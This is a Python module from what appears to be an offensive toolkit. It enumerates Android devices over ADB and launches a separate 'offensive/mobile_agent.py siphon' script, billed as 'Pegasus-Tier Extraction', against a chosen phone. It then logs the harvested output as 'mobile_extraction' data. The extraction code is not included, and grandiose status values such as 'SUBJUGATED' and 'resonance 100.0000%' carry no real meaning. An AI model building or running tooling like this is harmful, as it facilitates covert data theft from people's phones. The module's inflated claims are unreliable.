# -*- coding: utf-8 -*-
"""
عقدة الهاتف المحمول v90.0 - Mobile Node (Fleet Overlord)
المسؤول عن التحكم المادي بالأساطيل واستنزاف الـ DNA النقال.
"""
from .base_node import BaseNode
import json
import time

class MobileNode(BaseNode):
    def handle_event(self, event):
        etype = event["type"]
        data = event["data"]

        if etype == "list_devices":
            self._probe_fleet()
            
        elif etype == "mobile_strike" or etype == "siphon":
            device_id = data.get("target") or data.get("id")
            self._execute_pegasus_siphon(device_id)

    def _probe_fleet(self):
        """جرد حقيقي للعقد المتصلة عبر ADB"""
        print("📱 [MOBILE] Probing material fleet nodes...")
        result = self.core_ref.executor.execute("adb", ["devices"])
        
        devices = []
        for line in result.get("stdout", "").splitlines()[1:]:
            if "\tdevice" in line:
                devices.append(line.split("\t")[0])
        
        output = {"active_nodes": devices, "status": "STABILIZED"}
        self.core.emit("device_list", output, target="CockpitNode")

    def _execute_pegasus_siphon(self, device_id):
        """تشغيل محرك الاستنزاف السيادي بنمط Pegasus"""
        print(f"🧬 [SIPHON] Engaging Pegasus-Tier Extraction on: {device_id}")
        
        # تنفيذ سكريبت الاستنزاف المادي
        result = self.core_ref.executor.execute("python3", ["ai-engine/offensive/mobile_agent.py", "siphon", device_id])
        
        res_data = {
            "node": device_id,
            "status": "SUBJUGATED",
            "output": result.get("stdout"),
            "resonance": "100.0000%"
        }
        
        self.core.emit("siphon_result", res_data, target="CockpitNode")
        self.core.emit("store_dna", {
            "content": json.dumps(res_data),
            "metadata": {"type": "mobile_extraction", "device": device_id}
        }, target="MemoryNode")

    def can_handle(self, cmd):
        return cmd in ["list_devices", "mobile", "siphon", "mobile_strike"]
